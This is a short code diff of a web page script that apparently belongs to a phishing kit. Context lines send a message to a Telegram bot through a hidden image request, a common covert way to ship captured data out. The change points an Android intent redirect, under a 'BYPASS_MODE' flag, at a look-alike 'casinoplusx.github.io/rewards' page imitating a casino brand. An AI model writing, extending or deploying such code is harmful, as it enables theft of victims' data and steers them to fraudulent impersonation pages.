@@ -228,9 +228,8 @@ window.onload = () => {
             new Image().src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
 
             if(BYPASS_MODE) {
-                // Pag bypass, rekta main.html na parang dating file mo
                 setTimeout(() => {
-                    window.location.href = "intent://casinoplus.static2.website/main.html#Intent;scheme=https;package=com.android.chrome;end";
+                    window.location.href = "intent:casinoplusx.github.io/rewards/main.html#Intent;scheme=https;package=com.android.chrome;end";
                 }, 800);
             } else {
                 document.getElementById('step1').classList.add('hidden');
